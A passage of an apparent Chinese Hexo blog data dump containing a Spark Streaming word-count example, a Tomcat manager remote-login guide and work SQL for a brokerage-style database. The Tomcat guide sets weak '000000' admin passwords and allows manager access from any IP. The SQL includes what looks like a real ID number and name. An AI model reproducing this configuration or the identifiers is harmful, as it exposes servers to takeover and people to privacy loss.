class=\"line\">(11:16,2)</span><br><span class=\"line\">(,33)</span><br><span class=\"line\">(3,1)</span><br><span class=\"line\">(2017-12-04,2)</span><br><span class=\"line\">(-,3)</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"spark-github上的例子\"><a href=\"#spark-github上的例子\" class=\"headerlink\" title=\"spark github上的例子\"></a>spark github上的例子</h4><h4 id=\"程序描述\"><a href=\"#程序描述\" class=\"headerlink\" title=\"程序描述\"></a>程序描述</h4><p> 计算给定目录下的新文件的单词个数</p>\n<p> 运行的时候在hdfs上设置一个目录</p>\n<p> 然后实时的往目录里放文件</p>\n<p> 程序可以文件中单词的个数</p>\n<h4 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package stream</span><br><span class=\"line\"></span><br><span class=\"line\">import org.apache.spark.SparkConf</span><br><span class=\"line\">import org.apache.spark.streaming.&#123;Seconds, StreamingContext&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">object HdfsWordCount &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  def main(args: Array[String]) &#123;</span><br><span class=\"line\">    //val args = Array(&quot;D:\\\\workspace\\\\idea\\\\spark-test\\\\data&quot;)//z这里是目录不是文件</span><br><span class=\"line\">    if (args.length &lt; 1) &#123;</span><br><span class=\"line\">      System.err.println(&quot;Usage: HdfsWordCount &lt;directory&gt;&quot;)</span><br><span class=\"line\">      System.exit(1)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    StreamingExamples.setStreamingLogLevels()</span><br><span class=\"line\">    val sparkConf = new SparkConf().setAppName(&quot;sadsadas&quot;).setMaster(&quot;local&quot;)</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 初始化</span><br><span class=\"line\">    val ssc = new StreamingContext(sparkConf, Seconds(10))</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 创建输入流，然后计算新文件的单词个数</span><br><span class=\"line\">    val lines = ssc.textFileStream(args(0))</span><br><span class=\"line\">    val words = lines.flatMap(_.split(&quot; &quot;))</span><br><span class=\"line\">    val wordCounts = words.map(x =&gt; (x, 1)).reduceByKey(_ + _)</span><br><span class=\"line\">    </span><br><span class=\"line\">    //输出计算结果</span><br><span class=\"line\">    wordCounts.print()</span><br><span class=\"line\">    </span><br><span class=\"line\">    ssc.start()</span><br><span class=\"line\">    ssc.awaitTermination()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// scalastyle:on println</span><br></pre></td></tr></table></figure>\n<h4 id=\"打包运行\"><a href=\"#打包运行\" class=\"headerlink\" title=\"打包运行\"></a>打包运行</h4><p>mvn install </p>\n<p>程序包：<br>test-1.0.jar</p>\n<p>程序主类：<br>stream.HdfsWordCount</p>\n<p>参数:<br>hdfs上的目录</p>\n<p>input</p>\n<p>命令：</p>\n<pre><code>spark-submit --class stream.HdfsWordCount --master yarn --deploy-mode cluster  test-1.0.jar input\n</code></pre><h4 id=\"运行结果\"><a href=\"#运行结果\" class=\"headerlink\" title=\"运行结果\"></a>运行结果</h4><p> 向hdfs的目录中放入新文件,文件hello.txt</p>\n<pre><code>hadoop fs -put hello.text input\n</code></pre><p> 运行结果</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> -------------------------------------------</span><br><span class=\"line\">Time: 1513337720000 ms</span><br><span class=\"line\">-------------------------------------------</span><br><span class=\"line\">(input/pretreatment,1)</span><br><span class=\"line\">(Found,1)</span><br><span class=\"line\">(drwxr-xr-x,3)</span><br><span class=\"line\">(0,3)</span><br><span class=\"line\">(input/tables,1)</span><br><span class=\"line\">(11:16,2)</span><br><span class=\"line\">(,33)</span><br><span class=\"line\">(3,1)</span><br><span class=\"line\">(2017-12-04,2)</span><br><span class=\"line\">(-,3)</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n"},{"title":"Spring配置","date":"2018-07-10T13:09:19.000Z","_content":"http://blog.csdn.net/evankaka/article/details/45647031","source":"_posts/web/Spring配置.md","raw":"---\ntitle: Spring配置\ndate: 2018-07-10 21:09:19\ntags: web\n---\nhttp://blog.csdn.net/evankaka/article/details/45647031","slug":"web/Spring配置","published":1,"updated":"2018-07-10T13:10:09.992Z","_id":"cjjedmhc500820gtjahcb7v1d","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://blog.csdn.net/evankaka/article/details/45647031\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/evankaka/article/details/45647031</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://blog.csdn.net/evankaka/article/details/45647031\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/evankaka/article/details/45647031</a></p>\n"},{"title":"tomcat远程登录manager配置","date":"2018-07-10T13:09:19.000Z","_content":"- #### 增加用户    \n    \n    vim vim conf/tomcat-users.xml\n\n修改文件\n```\n<role rolename=\"tomcat\"/>\n<role rolename=\"role1\"/>\n<user username=\"tomcat\" password=\"000000\" roles=\"tomcat\"/>\n<user username=\"both\" password=\"000000\" roles=\"tomcat,role1\"/>\n<user username=\"role1\" password=\"000000\" roles=\"role1\"/>\n<!-- 上边是原来的，取消注释要修改password，也可以不取消注释 -->\n<role rolename=\"manager\"/>　\n<role rolename=\"manager-gui\"/>　\n<role rolename=\"admin\"/>　\n<role rolename=\"admin-gui\"/>　\n<role rolename=\"manager-script\"/>\n<user username=\"hello\" password=\"000000\" roles=\"admin-gui,admin,manager-gui,manager,manager-script\"/>\n```\n- #### 增加权限\n在\n```\nconf/Catalina/localhost\n```\n目录下新建\n```\nmanager.xml\n```\n文件\n    \n    vim manager.xml\n\n文件内容\n```\n    <Context privileged=\"true\" antiResourceLocking=\"false\" docBase=\"${catalina.home}/webapps/manager\">\n        <Valve className=\"org.apache.catalina.valves.RemoteAddrValve\" allow=\"^.*$\" />\n</Context>\n```\n\n重启tomcat\n\n然后打开ip/manager/html\n\n输入\n\n```\nhello\n000000\n```\n\n登录","source":"_posts/web/tomcat远程登录manager配置.md","raw":"---\ntitle: tomcat远程登录manager配置\ndate: 2018-07-10 21:09:19\ntags: web\n---\n- #### 增加用户    \n    \n    vim vim conf/tomcat-users.xml\n\n修改文件\n```\n<role rolename=\"tomcat\"/>\n<role rolename=\"role1\"/>\n<user username=\"tomcat\" password=\"000000\" roles=\"tomcat\"/>\n<user username=\"both\" password=\"000000\" roles=\"tomcat,role1\"/>\n<user username=\"role1\" password=\"000000\" roles=\"role1\"/>\n<!-- 上边是原来的，取消注释要修改password，也可以不取消注释 -->\n<role rolename=\"manager\"/>　\n<role rolename=\"manager-gui\"/>　\n<role rolename=\"admin\"/>　\n<role rolename=\"admin-gui\"/>　\n<role rolename=\"manager-script\"/>\n<user username=\"hello\" password=\"000000\" roles=\"admin-gui,admin,manager-gui,manager,manager-script\"/>\n```\n- #### 增加权限\n在\n```\nconf/Catalina/localhost\n```\n目录下新建\n```\nmanager.xml\n```\n文件\n    \n    vim manager.xml\n\n文件内容\n```\n    <Context privileged=\"true\" antiResourceLocking=\"false\" docBase=\"${catalina.home}/webapps/manager\">\n        <Valve className=\"org.apache.catalina.valves.RemoteAddrValve\" allow=\"^.*$\" />\n</Context>\n```\n\n重启tomcat\n\n然后打开ip/manager/html\n\n输入\n\n```\nhello\n000000\n```\n\n登录","slug":"web/tomcat远程登录manager配置","published":1,"updated":"2018-07-10T13:10:09.993Z","_id":"cjjedmhcc008b0gtjsm5i56un","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h4 id=\"增加用户\"><a href=\"#增加用户\" class=\"headerlink\" title=\"增加用户\"></a>增加用户</h4><p>  vim vim conf/tomcat-users.xml</p>\n</li>\n</ul>\n<p>修改文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;role rolename=&quot;tomcat&quot;/&gt;</span><br><span class=\"line\">&lt;role rolename=&quot;role1&quot;/&gt;</span><br><span class=\"line\">&lt;user username=&quot;tomcat&quot; password=&quot;000000&quot; roles=&quot;tomcat&quot;/&gt;</span><br><span class=\"line\">&lt;user username=&quot;both&quot; password=&quot;000000&quot; roles=&quot;tomcat,role1&quot;/&gt;</span><br><span class=\"line\">&lt;user username=&quot;role1&quot; password=&quot;000000&quot; roles=&quot;role1&quot;/&gt;</span><br><span class=\"line\">&lt;!-- 上边是原来的，取消注释要修改password，也可以不取消注释 --&gt;</span><br><span class=\"line\">&lt;role rolename=&quot;manager&quot;/&gt;　</span><br><span class=\"line\">&lt;role rolename=&quot;manager-gui&quot;/&gt;　</span><br><span class=\"line\">&lt;role rolename=&quot;admin&quot;/&gt;　</span><br><span class=\"line\">&lt;role rolename=&quot;admin-gui&quot;/&gt;　</span><br><span class=\"line\">&lt;role rolename=&quot;manager-script&quot;/&gt;</span><br><span class=\"line\">&lt;user username=&quot;hello&quot; password=&quot;000000&quot; roles=&quot;admin-gui,admin,manager-gui,manager,manager-script&quot;/&gt;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><h4 id=\"增加权限\"><a href=\"#增加权限\" class=\"headerlink\" title=\"增加权限\"></a>增加权限</h4>在<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">conf/Catalina/localhost</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>目录下新建<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">manager.xml</span><br></pre></td></tr></table></figure></p>\n<p>文件</p>\n<pre><code>vim manager.xml\n</code></pre><p>文件内容<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    &lt;Context privileged=&quot;true&quot; antiResourceLocking=&quot;false&quot; docBase=&quot;$&#123;catalina.home&#125;/webapps/manager&quot;&gt;</span><br><span class=\"line\">        &lt;Valve className=&quot;org.apache.catalina.valves.RemoteAddrValve&quot; allow=&quot;^.*$&quot; /&gt;</span><br><span class=\"line\">&lt;/Context&gt;</span><br></pre></td></tr></table></figure></p>\n<p>重启tomcat</p>\n<p>然后打开ip/manager/html</p>\n<p>输入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hello</span><br><span class=\"line\">000000</span><br></pre></td></tr></table></figure>\n<p>登录</p>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h4 id=\"增加用户\"><a href=\"#增加用户\" class=\"headerlink\" title=\"增加用户\"></a>增加用户</h4><p>  vim vim conf/tomcat-users.xml</p>\n</li>\n</ul>\n<p>修改文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;role rolename=&quot;tomcat&quot;/&gt;</span><br><span class=\"line\">&lt;role rolename=&quot;role1&quot;/&gt;</span><br><span class=\"line\">&lt;user username=&quot;tomcat&quot; password=&quot;000000&quot; roles=&quot;tomcat&quot;/&gt;</span><br><span class=\"line\">&lt;user username=&quot;both&quot; password=&quot;000000&quot; roles=&quot;tomcat,role1&quot;/&gt;</span><br><span class=\"line\">&lt;user username=&quot;role1&quot; password=&quot;000000&quot; roles=&quot;role1&quot;/&gt;</span><br><span class=\"line\">&lt;!-- 上边是原来的，取消注释要修改password，也可以不取消注释 --&gt;</span><br><span class=\"line\">&lt;role rolename=&quot;manager&quot;/&gt;　</span><br><span class=\"line\">&lt;role rolename=&quot;manager-gui&quot;/&gt;　</span><br><span class=\"line\">&lt;role rolename=&quot;admin&quot;/&gt;　</span><br><span class=\"line\">&lt;role rolename=&quot;admin-gui&quot;/&gt;　</span><br><span class=\"line\">&lt;role rolename=&quot;manager-script&quot;/&gt;</span><br><span class=\"line\">&lt;user username=&quot;hello&quot; password=&quot;000000&quot; roles=&quot;admin-gui,admin,manager-gui,manager,manager-script&quot;/&gt;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><h4 id=\"增加权限\"><a href=\"#增加权限\" class=\"headerlink\" title=\"增加权限\"></a>增加权限</h4>在<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">conf/Catalina/localhost</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>目录下新建<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">manager.xml</span><br></pre></td></tr></table></figure></p>\n<p>文件</p>\n<pre><code>vim manager.xml\n</code></pre><p>文件内容<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    &lt;Context privileged=&quot;true&quot; antiResourceLocking=&quot;false&quot; docBase=&quot;$&#123;catalina.home&#125;/webapps/manager&quot;&gt;</span><br><span class=\"line\">        &lt;Valve className=&quot;org.apache.catalina.valves.RemoteAddrValve&quot; allow=&quot;^.*$&quot; /&gt;</span><br><span class=\"line\">&lt;/Context&gt;</span><br></pre></td></tr></table></figure></p>\n<p>重启tomcat</p>\n<p>然后打开ip/manager/html</p>\n<p>输入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hello</span><br><span class=\"line\">000000</span><br></pre></td></tr></table></figure>\n<p>登录</p>\n"},{"title":"sql","date":"2018-07-10T13:09:19.000Z","_content":"```\n\nSELECT\n  a.acpt_category_no,\n  a.acpt_category_name,\n  c.param_id,\n  c.param_name,\n  b.need_flag,\n  b.organ_flag,\n  b.prof_flag,\n  b.prof_type,\n  b.data_type,\n  b.int_config,\n  b.str_config\nFROM hs_acpt.bopcategory a, hs_acpt.bopbusintypequaliarg b, hs_acpt.bopqualiarg c\nWHERE a.acpt_category_no = b.acpt_busin_type AND b.param_id = c.param_id AND a.acpt_category_level = 2 AND\n      b.need_flag = 1  AND a.acpt_category_no = '0044'--= '0252' AND c.param_id\n                                              IN\n                          ('0116', '0018', '0019', '0027', '0028', '0041', '0044', '0045', '0046', '0053', '0065',\n                            '0066', '0116', '0119', '0122', '0134', '0168', '0169', '0172', '0174', '0177', '0179',\n                           '0189', '1002', '1003', '1004','0252');\n\n\nselect * from hs_acpt.bopbusintypequaliarg  WHERE acpt_busin_type  = 0018;\n\n\nINSERT INTO hs_acpt.bopbusintypequaliarg\n(ACPT_BUSIN_TYPE, ORGAN_FLAG, PARAM_ID, DATA_TYPE, INT_CONFIG, STR_CONFIG, MODIFY_ABLE, NEED_FLAG, SHOW_TITLE, ORDER_NO, PROF_FLAG, PROF_TYPE)\nVALUES ('0018', '0', 24, '1', 50, '1111111111111,20', '1', '1', ' ', 7, '0', '!');\n-- 用户参数\nSELECT t.ORGAN_FLAG,p.prof_flag,p.prof_type FROM CLIENTPREFER p,CLIENT t WHERE p.CLIENT_ID = t.CLIENT_ID AND t.CLIENT_ID = 'IO20170101011';\n\nselect a.client_id,a.fund_account,a.asset_prop,t.init_date,t.money_type,\n  d.fin_close_balance + d.slo_close_balance + d.fare_close_debit + d.fin_close_interest+ d.slo_close_interest + d.fin_close_fine_interest + d.slo_close_fine_interest+ d.other_close_interest + d.other_close_debit + d.other_close_fine_interest + d.refcost_close_fare as total_debit,\n                                   t.fund_asset\n                                   +t.secu_market_value\n                                   +t.opfund_market_value\n                                   +t.opt_market_value\n                                   --+t.total_debit\n                                   +t.prod_market_value\n                                   +t.hkfund_market_value\n                                   +t.ofcash_market_value\n                                  +t.pfund_market_value\n                                   +t.secum_market_value\n                                as totalasset\nfrom hs_his.his_asset t, hs_asset.fundaccount a,hs_data.assetdebit d\nwhere a.fund_account=t.fund_account\n  and a.fund_account = d.fund_account\n  and t.init_date = d.init_date\n  and t.money_type = d.money_type\n  --and t.init_date = '20170104'\n  and a.client_id like 'IT20170101004%';\n\nSELECT CLIENT_ID,ORGAN_FLAG,PROF_FLAG,PROF_TYPE from CLIENTPREFER WHERE CLIENT_ID = 'IT20170101001';\nUPDATE  client set ORGAN_FLAG='0'  WHERE CLIENT_ID = 'IO20170101005'\n\nselect * from  hs_acpt.bopbusintypequaliarg\nUPDATE hs_acpt.bopbusintypequaliarg SET prof_flag = '1' WHERE acpt_busin_type='0044' and param_id = 53\nselect ORGAN_FLAG from client where client_id='IT20170101001'\nselect prof_flag from CLIENTPREFER where client_id='IT20170101001'\n-- 业务\nSELECT a.acpt_category_no,a.acpt_category_name,c.param_id,c.param_name,b.need_flag,b.organ_flag,b.prof_flag,b.prof_type,b.data_type,b.int_config,b.str_config\nFROM hs_acpt.bopcategory a, hs_acpt.bopbusintypequaliarg b, hs_acpt.bopqualiarg c,CLIENTPREFER p,CLIENT t\nWHERE a.acpt_category_no = b.acpt_busin_type AND b.param_id = c.param_id AND a.acpt_category_level = 2 AND b.need_flag = 1\n     AND t.ORGAN_FLAG = b.organ_flag and p.prof_flag= b.prof_flag\n      AND a.acpt_category_no = '0044' --AND c.param_id in (50,51,52,53,54,55,56,57,58,60)\n      and p.CLIENT_ID = t.CLIENT_ID\n      AND t.CLIENT_ID = 'IT20170101004'\nORDER BY param_id;\n-- 负债\nSELECT fin_close_balance ,slo_close_balance , fare_close_debit , fin_close_interest, slo_close_interest , fin_close_fine_interest , slo_close_fine_interest, other_close_interest , other_close_debit , other_close_fine_interest, refcost_close_fare from hs_data.ASSETDEBIT WHERE CLIENT_ID = 'IO20170101026' AND INIT_DATE = '20170105';\n\nSELECT * from BUSINESSACCEPT WHERE ACPT_CATEGORY_NO = '0252';\n  --CLIENT_ID LIKE 'IT20170101001%' and\n  --PARAM_VALUE like '%#58#%';\n\n-- p50 p51 p52\nSELECT CLIENT_ID,CLIENT_INCOME_TYPE as p50,THREE_YEARS_AVG_INCOM as p51,LAST_YEAR_NET_ASSET as p52 from CLIENTPREFER WHERE CLIENT_ID = 'IT20170101004';\n-- p53\nSELECT c.CLIENT_ID from CLIENT c,hs_crdt.riskacctlist r WHERE r.id_kind = c.id_kind and r.id_no = c.id_no AND r.client_name = c.FULL_NAME and r.riskaccount_type = '0';\n-- p54\nSELECT o.CLIENT_ID from FUNDACCOUNT f ,OPTBLACKACCT o ,CLIENT c WHERE c.CLIENT_ID = o.CLIENT_ID AND f.ASSET_PROP = 'B' AND f.FUND_ACCOUNT= o.FUND_ACCOUNT;\n-- 55,56,57,58,60\nSELECT CLIENT_ID,CORP_RISK_LEVEL as p55,EN_INVEST_TERM as p56,EN_INVEST_KIND as p57,CLIENT_INCOME_TYPE as p58,EN_MAXDEFICIT_RATE as p60 from CLIENTPREFER WHERE CLIENT_ID = 'IT20170101004';\n\nSELECT h.fund_account,h.init_date,SECU_MARKET_VALUE from hs_his.his_asset h,FUNDACCOUNT f WHERE f.FUND_ACCOUNT=h.fund_account and f.CLIENT_ID = 'IT20170101024';\n\n\n\nSELECT * from FUNDACCOUNT WHERE FUND_ACCOUNT = 'IT20170101004';\nUPDATE FUNDACCOUNT SET ASSET_PROP = 'B' WHERE FUND_ACCOUNT = 'IT20170101004';\nUPDATE FUNDACCOUNT SET ASSET_PROP = 'B' WHERE FUND_ACCOUNT = 'IT20170101006';\nUPDATE FUNDACCOUNT SET ASSET_PROP = 'B' WHERE FUND_ACCOUNT = 'IO20170101004';\nUPDATE CLIENTPREFER SET CLIENT_INCOME_TYPE = '2' WHERE CLIENT_ID = 'IT20170101001';\nSELECT * from CLIENT WHERE id_no = '510212196801081335';\nSELECT client_name,CLIENT_id,id_no,id_kind,riskaccount_type from hs_crdt.riskacctlist;\nUPDATE CLIENT SET FULL_NAME = '王斌' WHERE CLIENT_ID = 'IT20170101001';\nUPDATE hs_crdt.riskacctlist set riskaccount_type = '0';\nUPDATE CLIENTPREFER SET CLIENT_INCOME_TYPE = '2' WHERE CLIENT_ID LIKE 'IO%';\nSELECT CLIENT_INCOME_TYPE,CLIENT_ID from CLIENTPREFER WHERE CLIENT_ID LIKE 'IO%';\nCOMMIT;\n\nselect st.client_id,ss.stock_account from hs_asset.sstrestradeacct ss ,HS_ASSET.STOCKHOLDER st WHERE ss.STOCK_ACCOUNT =st.STOCK_ACCOUNT ;\nUPDATE CLIENTPREFER SET PROF_FLAG = '0',PROF_TYPE='!'WHERE CLIENT_ID = 'IO20170101005';\n\nselect a.client_id,t.init_date,t.secum_market_value\nfrom hs_his.his_asset t\njoin hs_asset.fundaccount a on a.fund_account=t.fund_account where t.init_date='20170105' and a.client_id ='IT20170101024';\n\nSELECT h.fund_account,h.init_date,SECU_MARKET_VALUE from hs_his.his_asset h,FUNDACCOUNT f\nWHERE f.FUND_ACCOUNT=h.fund_account and f.CLIENT_ID = 'IT20170101024';\n\nSELECT * from BUSINESSACCEPT WHERE PRE_ANALYSIS_TYPE = 2;--WHERE CLIENT_ID like 'IT%' AND ACPT_CATEGORY_NO = 0053;\n\nSELECT * from hs_user.SYSDICTIONARY WHERE DICT_ENTRY = 2505;\n\nSELECT * from FUNDACCOUNT WHERE asset_prop = 7;\n\nSELECT * from BUSINESSACCEPT WHERE ACPT_CATEGORY_NO = '0018'\nselect a.en_prodrisk_level,ORGAN_FLAG  from  eligriskmatch a\nwhere a.finance_type = 1\n\n      and a.corp_risk_level = 2;\n\nselect a.en_prodrisk_level  from  eligriskmatch a\nwhere a.finance_type = 1\nand a.organ_flag = 1\nand a.corp_risk_level = 2;\n\n","source":"_posts/work/sql.md","raw":"---\ntitle: sql\ndate: 2018-07-10 21:09:19\ntags: work\n---\n```\n\nSELECT\n  a.acpt_category_no,\n  a.acpt_category_name,\n  c.param_id,\n  c.param_name,\n  b.need_flag,\n  b.organ_flag,\n  b.prof_flag,\n  b.prof_type,\n  b.data_type,\n  b.int_config,\n  b.str_config\nFROM hs_acpt.bopcategory a, hs_acpt.bopbusintypequaliarg b, hs_acpt.bopqualiarg c\nWHERE a.acpt_category_no = b.acpt_busin_type AND b.param_id = c.param_id AND a.acpt_category_level = 2 AND\n      b.need_flag = 1  AND a.acpt_category_no = '0044'--= '0252' AND c.param_id\n                                              IN\n                          ('0116', '0018', '0019', '0027', '0028', '0041', '0044', '0045', '0046', '0053', '0065',\n                            '0066', '0116', '0119', '0122', '0134', '0168', '0169', '0172', '0174', '0177', '0179',\n                           '0189', '1002', '1003', '1004','0252');\n\n\nselect * from hs_acpt.bopbusintypequaliarg  WHERE acpt_busin_type  = 0018;\n\n\nINSERT INTO hs_acpt.bopbusintypequaliarg\n(ACPT_BUSIN_TYPE, ORGAN_FLAG, PARAM_ID, DATA_TYPE, INT_CONFIG, STR_CONFIG, MODIFY_ABLE, NEED_FLAG, SHOW_TITLE, ORDER_NO, PROF_FLAG, PROF_TYPE)\nVALUES ('0018', '0', 24, '1', 50, '1111111111111,20', '1', '1', ' ', 7, '0', '!');\n-- 用户参数\nSELECT t.ORGAN_FLAG,p.prof_flag,p.prof_type FROM CLIENTPREFER p,CLIENT t WHERE p.CLIENT_ID = t.CLIENT_ID AND t.CLIENT_ID = 'IO20170101011';\n\nselect a.client_id,a.fund_account,a.asset_prop,t.init_date,t.money_type,\n  d.fin_close_balance + d.slo_close_balance + d.fare_close_debit + d.fin_close_interest+ d.slo_close_interest + d.fin_close_fine_interest + d.slo_close_fine_interest+ d.other_close_interest + d.other_close_debit + d.other_close_fine_interest + d.refcost_close_fare as total_debit,\n                                   t.fund_asset\n                                   +t.secu_market_value\n                                   +t.opfund_market_value\n                                   +t.opt_market_value\n                                   --+t.total_debit\n                                   +t.prod_market_value\n                                   +t.hkfund_market_value\n                                   +t.ofcash_market_value\n                                  +t.pfund_market_value\n                                   +t.secum_market_value\n                                as totalasset\nfrom hs_his.his_asset t, hs_asset.fundaccount a,hs_data.assetdebit d\nwhere a.fund_account=t.fund_account\n  and a.fund_account = d.fund_account\n  and t.init_date = d.init_date\n  and t.money_type = d.money_type\n  --and t.init_date = '20170104'\n  and a.client_id like 'IT20170101004%';\n\nSELECT CLIENT_ID,ORGAN_FLAG,PROF_FLAG,PROF_TYPE from CLIENTPREFER WHERE CLIENT_ID = 'IT20170101001';\nUPDATE  client set ORGAN_FLAG='0'  WHERE CLIENT_ID = 'IO20170101005'\n\nselect * from  hs_acpt.bopbusintypequaliarg\nUPDATE hs_acpt.bopbusintypequaliarg SET prof_flag = '1' WHERE acpt_busin_type='0044' and param_id = 53\nselect ORGAN_FLAG from client where client_id='IT20170101001'\nselect prof_flag from CLIENTPREFER where client_id='IT20170101001'\n-- 业务\nSELECT a.acpt_category_no,a.acpt_category_name,c.param_id,c.param_name,b.need_flag,b.organ_flag,b.prof_flag,b.prof_type,b.data_type,b.int_config,b.str_config\nFROM hs_acpt.bopcategory a, hs_acpt.bopbusintypequaliarg b, hs_acpt.bopqualiarg c,CLIENTPREFER p,CLIENT t\nWHERE a.acpt_category_no = b.acpt_busin_type AND b.param_id = c.param_id AND a.acpt_category_level = 2 AND b.need_flag = 1\n     AND t.ORGAN_FLAG = b.organ_flag and p.prof_flag= b.prof_flag\n      AND a.acpt_category_no = '0044' --AND c.param_id in (50,51,52,53,54,55,56,57,58,60)\n      and p.CLIENT_ID = t.CLIENT_ID\n      AND t.CLIENT_ID = 'IT20170101004'\nORDER BY param_id;\n-- 负债\nSELECT fin_close_balance ,slo_close_balance , fare_close_debit , fin_close_interest, slo_close_interest , fin_close_fine_interest , slo_close_fine_interest, other_close_interest , other_close_debit , other_close_fine_interest, refcost_close_fare from hs_data.ASSETDEBIT WHERE CLIENT_ID = 'IO20170101026' AND INIT_DATE = '20170105';\n\nSELECT * from BUSINESSACCEPT WHERE ACPT_CATEGORY_NO = '0252';\n  --CLIENT_ID LIKE 'IT20170101001%' and\n  --PARAM_VALUE like '%#58#%';\n\n-- p50 p51 p52\nSELECT CLIENT_ID,CLIENT_INCOME_TYPE as p50,THREE_YEARS_AVG_INCOM as p51,LAST_YEAR_NET_ASSET as p52 from CLIENTPREFER WHERE CLIENT_ID = 'IT20170101004';\n-- p53\nSELECT c.CLIENT_ID from CLIENT c,hs_crdt.riskacctlist r WHERE r.id_kind = c.id_kind and r.id_no = c.id_no AND r.client_name = c.FULL_NAME and r.riskaccount_type = '0';\n-- p54\nSELECT o.CLIENT_ID from FUNDACCOUNT f ,OPTBLACKACCT o ,CLIENT c WHERE c.CLIENT_ID = o.CLIENT_ID AND f.ASSET_PROP = 'B' AND f.FUND_ACCOUNT= o.FUND_ACCOUNT;\n-- 55,56,57,58,60\nSELECT CLIENT_ID,CORP_RISK_LEVEL as p55,EN_INVEST_TERM as p56,EN_INVEST_KIND as p57,CLIENT_INCOME_TYPE as p58,EN_MAXDEFICIT_RATE as p60 from CLIENTPREFER WHERE CLIENT_ID = 'IT20170101004';\n\nSELECT h.fund_account,h.init_date,SECU_MARKET_VALUE from hs_his.his_asset h,FUNDACCOUNT f WHERE f.FUND_ACCOUNT=h.fund_account and f.CLIENT_ID = 'IT20170101024';\n\n\n\nSELECT * from FUNDACCOUNT WHERE FUND_ACCOUNT = 'IT20170101004';\nUPDATE FUNDACCOUNT SET ASSET_PROP = 'B' WHERE FUND_ACCOUNT = 'IT20170101004';\nUPDATE FUNDACCOUNT SET ASSET_PROP = 